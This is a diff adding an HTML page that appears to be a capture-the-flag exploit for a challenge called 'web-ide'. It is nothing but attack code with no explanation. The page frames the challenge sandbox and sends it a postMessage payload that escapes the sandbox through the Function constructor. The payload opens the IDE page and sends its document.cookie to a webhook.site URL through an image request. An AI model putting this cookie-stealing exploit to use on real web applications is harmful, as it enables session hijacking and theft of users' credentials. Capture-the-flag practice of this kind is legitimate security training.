@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+</head>
+<body>
+    <iframe name="f" onload="run()" src="https://web-ide.dicec.tf/sandbox.html"></iframe>
+    <script>
+      function run() {
+        window.frames.f.postMessage(`([].map.constructor('var w1=window.open("https://web-ide.dicec.tf/ide");' + 
+          'setTimeout(()=>{var c=document.createElement("img");' + 
+          'c.src="https://webhook.site/8ee5457c-df16-4b08-9dbc-b72af16bc1a2?c="+w1.document.cookie;document.body.appendChild(c);}, 2000)'))()
+        `, '*')
+      }
+    </script>
+</body>
+
+</html>
